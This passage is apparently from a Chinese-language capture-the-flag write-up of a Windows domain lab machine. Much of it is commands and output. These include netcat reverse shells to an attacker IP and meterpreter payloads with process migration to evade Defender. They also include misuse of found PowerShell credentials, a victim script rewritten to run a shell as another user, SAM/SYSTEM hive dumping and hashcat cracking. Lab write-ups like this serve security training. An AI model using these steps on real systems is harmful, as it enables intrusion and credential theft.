+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e8%b0%83%e7%94%a8invoke-portscanps1" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$content</span> <span class="p">=</span> <span class="nb">Get-Content</span> <span class="p">.\</span><span class="nb">invoke-portscan</span><span class="p">.</span><span class="py">ps1</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$content</span><span class="p">[</span><span class="mf">0</span><span class="p">..(</span><span class="nv">$content</span><span class="p">.</span><span class="py">Count</span> <span class="p">-</span> <span class="mf">3</span><span class="p">)]</span> <span class="p">|</span> <span class="nb">Set-Content</span> <span class="p">.\</span><span class="nb">invoke-portscan</span><span class="p">.</span><span class="py">ps1</span>
+</span></span></code></pre></div><p>这里想写入一下执行命令到invoke-portscan.ps1脚本，但是powershell中<code>Out-File -Append</code>或者<code>Add-Content</code>默认都会添加换行符，即使加上<code>-NoNewline</code>也会非预期的加入换行符，需要通过<code>.NET</code>流操作</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$path</span> <span class="p">=</span> <span class="s2">&#34;Invoke-portscan.ps1&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$data</span> <span class="p">=</span> <span class="s2">&#34;Invoke-PortScan -StartAddress 172.16.22.2 -EndAddress 172.16.22.2 -ScanPort&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$stream</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.IO.File</span><span class="p">]::</span><span class="n">Open</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="s1">&#39;Append&#39;</span><span class="p">,</span> <span class="s1">&#39;Write&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$writer</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">IO</span><span class="p">.</span><span class="py">StreamWriter</span><span class="p">(</span><span class="nv">$stream</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$writer</span><span class="p">.</span><span class="py">Write</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>  <span class="c"># 不加换行</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$writer</span><span class="p">.</span><span class="py">Close</span><span class="p">()</span>
+</span></span></code></pre></div><p>但是突然想到一个问题，直接上传nc然后执行还没有试过，结果直接执行竟然直接成功了&hellip;&hellip;&hellip;&hellip;.中间折腾ps1，chisel转发winrm之类的整了半天&hellip;&hellip;.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&#34;http://10.10.14.9/nc.exe&#34;</span> <span class="n">-OutFile</span> <span class="s2">&#34;nc.exe&#34;</span> <span class="n">-UseBasicParsing</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">nc</span><span class="p">.</span><span class="py">exe</span> <span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="py">9</span> <span class="mf">4444</span> <span class="n">-e</span> <span class="n">powershell</span><span class="p">.</span><span class="py">exe</span>
+</span></span></code></pre></div>
+<h4 class="relative group">msfconsole 
+    <div id="msfconsole" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#msfconsole" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>这里load powershell没成功执行，可以先执行<code>shell</code>，再执行<code>powershell</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfconsole
+</span></span><span class="line"><span class="cl">use exploit/multi/handler
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> payload windows/x64/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> LHOST 10.10.14.9
+</span></span><span class="line"><span class="cl">run
+</span></span><span class="line"><span class="cl">load powershell
+</span></span><span class="line"><span class="cl">shell
+</span></span><span class="line"><span class="cl">powershell
+</span></span></code></pre></div><p>这里尝试了多种方式没找到太多的可以利用的点，实在是不行了winpeas自动枚举一下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="err">͹</span> <span class="n">Looking</span> <span class="k">for</span> <span class="n">possible</span> <span class="n">password</span> <span class="n">files</span> <span class="k">in</span> <span class="n">users</span> <span class="n">homes</span>                                         
+</span></span><span class="line"><span class="cl">  <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">book</span><span class="p">.</span><span class="py">hacktricks</span><span class="p">.</span><span class="n">wiki</span><span class="p">/</span><span class="n">en</span><span class="p">/</span><span class="nb">windows-hardening</span><span class="p">/</span><span class="nb">windows-local</span><span class="n">-privilege-escalation</span><span class="p">/</span><span class="n">index</span><span class="p">.</span><span class="n">html</span><span class="c">#files-and-registry-credentials</span>
+</span></span><span class="line"><span class="cl">    <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">All</span> <span class="n">Users</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">UEV</span><span class="p">\</span><span class="n">InboxTemplates</span><span class="p">\</span><span class="n">RoamingCredentialSettings</span><span class="p">.</span><span class="py">xml</span>            
+</span></span><span class="line"><span class="cl">    <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">edavies</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Local</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Edge</span><span class="p">\</span><span class="n">User</span> <span class="n">Data</span><span class="p">\</span><span class="n">ZxcvbnData</span><span class="p">\</span><span class="mf">2.0</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="mf">0</span><span class="p">\</span><span class="n">passwords</span><span class="p">.</span><span class="py">txt</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">ls </span><span class="s1">&#39;C:\Users\edavies\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\2.0.0.0\passwords.txt&#39;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">length</span> <span class="mf">271951</span>
+</span></span></code></pre></div><p>![[Pasted image 20250721211733.png]]</p>
+<p>存在RDP登录，用msf截图一下看看远程桌面在执行什么</p>
+
+<h4 class="relative group">meterpreter 
+    <div id="meterpreter" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#meterpreter" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>通过msf得到session之后，使用后渗透模块的进程迁移功能迁移当前进程到<code>explorer.exe</code>，再执行<code>screenshot</code>，执行<code>screenshare</code>的话，大概率很快就会被<code>defender</code>拿下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">x64</span><span class="p">/</span><span class="n">meterpreter</span><span class="p">/</span><span class="n">reverse_tcp</span> <span class="n">lhost</span><span class="p">=</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="py">12</span> <span class="n">lport</span><span class="p">=</span><span class="mf">4444</span> <span class="o">-f</span> <span class="n">exe</span> <span class="n">-o</span> <span class="n">rev</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">msfconsole</span>
+</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="n">exploit</span><span class="p">/</span><span class="n">multi</span><span class="p">/</span><span class="n">handler</span>
+</span></span><span class="line"><span class="cl"><span class="n">run</span>
+</span></span></code></pre></div><p>使用msf的后渗透模块进行进程迁移</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">bg</span>
+</span></span><span class="line"><span class="cl">use post/windows/manage/migrate
+</span></span><span class="line"><span class="cl">sessions
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> session <span class="m">2</span> 
+</span></span><span class="line"><span class="cl">sessions -i <span class="m">2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">screenshot
+</span></span></code></pre></div><p>通过截图看到一个设置<code>pscredential</code>的过程</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$passwd</span> <span class="p">=</span> <span class="nb">convertto-securestring</span> <span class="s2">&#34;W3_4R3_th3_f0rce.&#34;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">system</span><span class="p">.</span><span class="py">management</span><span class="p">.</span><span class="py">automation</span><span class="p">.</span><span class="py">pscredential</span> <span class="p">(</span><span class="s2">&#34;ACUTE\imonks&#34;</span><span class="p">,</span> <span class="nv">$passwd</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Enter-PSSession</span> <span class="n">ATSSERVER</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ConfigurationName</span> <span class="n">dc_manage</span>
+</span></span></code></pre></div>
+<h4 class="relative group">通过pscredential调用invoke-command执行命令 
+    <div id="通过pscredential调用invoke-command执行命令" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e9%80%9a%e8%bf%87pscredential%e8%b0%83%e7%94%a8invoke-command%e6%89%a7%e8%a1%8c%e5%91%bd%e4%bb%a4" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>总结一下到此得到的信息：</p>
+<p><code>pscredential</code>
+域控名(通过.docx文档): <code>dc_manage</code>
+主机名: <code>ATSSERVER</code>
+用户名: <code>acute\imonks</code>
+<code>passwd</code>: <code>W3_4R3_th3_f0rce.</code></p>
+<p>如果已经得到了pscredential，如果凭证所属的主机开启了winrm，可以尝试远程登录powershell会话，通过pscredential验证smb服务从而传输文件，或者使用invoke-command命令执行命令</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># 测试winrm是否可以登录</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Test-WSMan</span> <span class="n">ATSSERVER</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">wsmid</span> <span class="err">:</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">schemas</span><span class="p">.</span><span class="py">dmtf</span><span class="p">.</span><span class="n">org</span><span class="p">/</span><span class="n">wbem</span><span class="p">/</span><span class="n">wsman</span><span class="p">/</span><span class="n">identity</span><span class="p">/</span><span class="mf">1</span><span class="p">/</span><span class="n">wsmanidentity</span><span class="p">.</span><span class="py">xsd</span> <span class="n">ProtocolVersion</span> <span class="err">:</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">schemas</span><span class="p">.</span><span class="py">dmtf</span><span class="p">.</span><span class="n">org</span><span class="p">/</span><span class="n">wbem</span><span class="p">/</span><span class="n">wsman</span><span class="p">/</span><span class="mf">1</span><span class="p">/</span><span class="n">wsman</span><span class="p">.</span><span class="py">xsd</span> <span class="n">ProductVendor</span> <span class="err">:</span> <span class="n">Microsoft</span> <span class="n">Corporation</span> <span class="n">ProductVersion</span> <span class="err">:</span> <span class="n">OS</span><span class="err">:</span> <span class="mf">0.0</span><span class="p">.</span><span class="py">0</span> <span class="n">SP</span><span class="err">:</span> <span class="mf">0.0</span> <span class="n">Stack</span><span class="err">:</span> <span class="mf">3.0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$passwd</span> <span class="p">=</span> <span class="nb">convertto-securestring</span> <span class="s2">&#34;W3_4R3_th3_f0rce.&#34;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">system</span><span class="p">.</span><span class="py">management</span><span class="p">.</span><span class="py">automation</span><span class="p">.</span><span class="py">pscredential</span> <span class="p">(</span><span class="s2">&#34;ACUTE\imonks&#34;</span><span class="p">,</span> <span class="nv">$passwd</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Enter-PSSession</span> <span class="n">ATSSERVER</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ConfigurationName</span> <span class="n">dc_manage</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Enter-PSSession</span> <span class="err">:</span> <span class="n">The</span> <span class="n">term</span> <span class="s1">&#39;Measure-Object&#39;</span> <span class="n">is</span> <span class="n">not</span> <span class="n">recognized</span> <span class="n">as</span> <span class="n">the</span> <span class="n">name</span> <span class="n">of</span> <span class="n">a</span> <span class="n">cmdlet</span><span class="p">,</span> <span class="n">function</span><span class="p">,</span> <span class="n">script</span> <span class="n">file</span><span class="p">,</span> <span class="n">or</span> 
+</span></span><span class="line"><span class="cl"><span class="n">operable</span> <span class="n">program</span><span class="p">.</span> <span class="n">Check</span> <span class="n">the</span> <span class="n">spelling</span> <span class="n">of</span> <span class="n">the</span> <span class="n">name</span><span class="p">,</span> <span class="n">or</span> <span class="k">if</span> <span class="n">a</span> <span class="n">path</span> <span class="n">was</span> <span class="n">included</span><span class="p">,</span> <span class="n">verify</span> <span class="n">that</span> <span class="n">the</span> <span class="n">path</span> <span class="n">is</span> <span class="n">correct</span> <span class="n">and</span> <span class="k">try</span> 
+</span></span><span class="line"><span class="cl"><span class="n">again</span><span class="p">.</span>
+</span></span></code></pre></div><p>直接登陆winrm提示缺少<code>Measure-Object</code>，无法直接调用winrm，虽然不能直接winrm登录，但是可以使用<code>invoke-command</code>来调用命令</p>
+<p>rlwrap得到一个交互性更好的shell</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo rlwrap -cAr nc -lvnp <span class="m">5555</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">iwr </span><span class="n">-uri</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">12</span><span class="p">/</span><span class="n">nc</span><span class="p">.</span><span class="py">exe</span> <span class="n">-outfile</span> <span class="n">nc</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">nc</span><span class="p">.</span><span class="py">exe</span> <span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="py">12</span> <span class="mf">5555</span> <span class="n">-e</span> <span class="n">cmd</span><span class="p">.</span><span class="py">exe</span>
+</span></span></code></pre></div>
+<h5 class="relative group">invoke-command 
+    <div id="invoke-command" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#invoke-command" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">invoke-command</span> <span class="n">-computerName</span> <span class="n">ATSSERVER</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ConfigurationName</span> <span class="n">dc_manage</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="nb">get-command</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># GET User Flag</span>
+</span></span><span class="line"><span class="cl"><span class="nb">invoke-command</span> <span class="n">-computerName</span> <span class="n">ATSSERVER</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ConfigurationName</span> <span class="n">dc_manage</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="nb">type </span><span class="n">c:</span><span class="p">\</span><span class="n">users</span><span class="p">\</span><span class="n">imonks</span><span class="p">\</span><span class="n">desktop</span><span class="p">\</span><span class="n">user</span><span class="p">.</span><span class="py">txt</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">invoke-command</span> <span class="n">-computerName</span> <span class="n">ATSSERVER</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ConfigurationName</span> <span class="n">dc_manage</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="nb">get-childitem</span> <span class="n">-force</span> <span class="p">..\</span><span class="n">desktop</span> <span class="p">}</span>
+</span></span></code></pre></div><p>在imonks用户的<code>desktop</code>中看到一个<code>wm.ps1</code>脚本</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$securepasswd</span> <span class="p">=</span> <span class="s1">&#39;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$passwd</span> <span class="p">=</span> <span class="nv">$securepasswd</span> <span class="p">|</span> <span class="nb">ConvertTo-SecureString</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$creds</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Management</span><span class="p">.</span><span class="py">Automation</span><span class="p">.</span><span class="py">PSCredential</span> <span class="p">(</span><span class="s2">&#34;acute\jmorgan&#34;</span><span class="p">,</span> <span class="nv">$passwd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Invoke-Command</span> <span class="n">-ScriptBlock</span> <span class="p">{</span><span class="nb">Get-Volume</span><span class="p">}</span> <span class="n">-ComputerName</span> <span class="nb">Acute-PC01</span> <span class="n">-Credential</span> <span class="nv">$creds</span>
+</span></span></code></pre></div><p>能看到这个脚本里设置了passwd，设置了creds，并且通过jmorgan用户调用命令<code>Get-Volume</code>，可以把<code>Get-Volume</code>命令替换成反弹shell的命令然后执行这个脚本从而以<code>jmorgan</code>用户的身份执行反弹shell</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Invoke-Command</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="p">((</span><span class="nb">cat </span><span class="p">..\</span><span class="n">desktop</span><span class="p">\</span><span class="n">wm</span><span class="p">.</span><span class="py">ps1</span> <span class="n">-Raw</span><span class="p">)</span> <span class="o">-replace</span> <span class="s1">&#39;Get-Volume&#39;</span><span class="p">,</span> <span class="s1">&#39;C:\utils\nc64.exe -e cmd 10.10.14.6 443&#39;</span><span class="p">)</span> <span class="p">|</span> <span class="nb">sc </span><span class="n">-Path</span> <span class="p">..\</span><span class="n">desktop</span><span class="p">\</span><span class="n">wm</span><span class="p">.</span><span class="py">ps1</span> <span class="p">}</span> <span class="n">-ComputerName</span> <span class="n">ATSSERVER</span> <span class="n">-ConfigurationName</span> <span class="n">dc_manage</span> <span class="n">-Credential</span> <span class="nv">$cred</span>
+</span></span></code></pre></div><p>如果要把<code>C:\utils\nc64.exe -e cmd 10.10.14.24 443</code>换成<code>C:\utils\nc.exe -e cmd 10.10.14.24 443</code>，需要把<code>C:\utils\nc64.exe -e cmd 10.10.14.24 443</code>写成<code>C:\\utils\\nc64.exe -e cmd 10.10.14.24 443</code>因为powershell的<code>-replace</code>使用正则表达式</p>
+<p>调用改写之后的wm.ps1脚本，得到<code>jmorgan</code>用户的shell</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">invoke-command</span> <span class="n">-computerName</span> <span class="n">ATSSERVER</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ConfigurationName</span> <span class="n">dc_manage</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="n">c:</span><span class="p">\</span><span class="n">users</span><span class="p">\</span><span class="n">imonks</span><span class="p">\</span><span class="n">desktop</span><span class="p">\</span><span class="n">wm</span><span class="p">.</span><span class="py">ps1</span> <span class="p">}</span> 
+</span></span></code></pre></div>
+<h4 class="relative group">提权 
+    <div id="提权" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%8f%90%e6%9d%83" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>jmorgan用户已经是本地管理员用户</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">jmorgan</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">net</span> <span class="n">localgroup</span> <span class="n">administrators</span>
+</span></span><span class="line"><span class="cl"><span class="n">net</span> <span class="n">localgroup</span> <span class="n">administrators</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Alias</span> <span class="n">name</span>     <span class="n">administrators</span>
+</span></span><span class="line"><span class="cl"><span class="n">Comment</span>        <span class="n">Administrators</span> <span class="n">have</span> <span class="n">complete</span> <span class="n">and</span> <span class="n">unrestricted</span> <span class="n">access</span> <span class="n">to</span> <span class="n">the</span> <span class="n">computer</span><span class="p">/</span><span class="n">domain</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Members</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">-------------------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="n">ACUTE</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>
+</span></span><span class="line"><span class="cl"><span class="n">ACUTE</span><span class="p">\</span><span class="n">jmorgan</span>
+</span></span><span class="line"><span class="cl"><span class="n">Administrator</span>
+</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="p">.</span>
+</span></span></code></pre></div><p>既然已经是管理员账户，直接拿一下sam和system</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">sam</span> <span class="n">sam</span><span class="p">.</span><span class="py">bak</span>
+</span></span><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">system</span> <span class="n">system</span><span class="p">.</span><span class="py">bak</span>
+</span></span></code></pre></div><p>直接通过msf控制台将sam和system文件下载到kali即可</p>
+<pre tabindex="0"><code class="language-meterpreter" data-lang="meterpreter">download sam.bak
+download system.bak
+</code></pre>
+<h5 class="relative group">impacket-secretsdump + hashcat破解NTML 
+    <div id="impacket-secretsdump--hashcat破解ntml" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#impacket-secretsdump--hashcat%e7%a0%b4%e8%a7%a3ntml" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
+<p>使用impacket的secretsdump工具拿到hash</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">└─$ impacket-secretsdump -sam sam.bak -system system.bak LOCAL    
+</span></span><span class="line"><span class="cl">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Target system bootKey: 0x44397c32a634e3d8d8f64bff8c614af7
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping <span class="nb">local</span> SAM hashes <span class="o">(</span>uid:rid:lmhash:nthash<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
+</span></span><span class="line"><span class="cl">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8e9ad4740:::
+</span></span><span class="line"><span class="cl">Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Cleaning up...
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">hashcat</span><span class="p">.</span><span class="py">exe</span> <span class="p">.\</span><span class="n">hashes</span><span class="p">\</span><span class="n">hash</span><span class="p">.</span><span class="py">sam</span> <span class="p">.\</span><span class="n">hashes</span><span class="p">\</span><span class="n">rockyou</span><span class="p">.</span><span class="py">txt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Dictionary</span> <span class="n">cache</span> <span class="n">built</span><span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="p">*</span> <span class="n">Filename</span><span class="p">..</span><span class="err">:</span> <span class="p">.\</span><span class="n">hashes</span><span class="p">\</span><span class="n">rockyou</span><span class="p">.</span><span class="py">txt</span>
+</span></span><span class="line"><span class="cl"><span class="p">*</span> <span class="n">Passwords</span><span class="p">.</span><span class="err">:</span> <span class="mf">14344392</span>
+</span></span><span class="line"><span class="cl"><span class="p">*</span> <span class="n">Bytes</span><span class="p">.....</span><span class="err">:</span> <span class="mf">139921507</span>
+</span></span><span class="line"><span class="cl"><span class="p">*</span> <span class="n">Keyspace</span><span class="p">..</span><span class="err">:</span> <span class="mf">14344385</span>
+</span></span><span class="line"><span class="cl"><span class="p">*</span> <span class="n">Runtime</span><span class="p">...</span><span class="err">:</span> <span class="mf">1</span> <span class="n">sec</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">31d6cfe0d16ae931b73c59d7e0c089c0</span><span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">a29f7623fd11550def0192de9246f46b</span><span class="err">:</span><span class="n">Password</span><span class="nv">@123</span>
+</span></span><span class="line"><span class="cl"><span class="n">Approaching</span> <span class="n">final</span> <span class="n">keyspace</span> <span class="p">-</span> <span class="n">workload</span> <span class="n">adjusted</span><span class="p">.</span>
+</span></span></code></pre></div><p>通过hashcat破解出了administrator用户的NT哈希<code>Password@123</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">awallace</span>
+</span></span><span class="line"><span class="cl"><span class="n">chall</span>
+</span></span><span class="line"><span class="cl"><span class="n">edavies</span>
+</span></span><span class="line"><span class="cl"><span class="n">imonks</span>
+</span></span><span class="line"><span class="cl"><span class="n">jmorgan</span>
+</span></span><span class="line"><span class="cl"><span class="n">lhopkins</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Password</span><span class="nv">@123</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Acute-PC01</span>
+</span></span></code></pre></div><p>PSWA界面用<code>Password@123</code>没有用户能成功登录，invoke-command用awallace用户成功执行</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">awallace</span><span class="p">,</span> <span class="n">Password</span><span class="nv">@123</span>
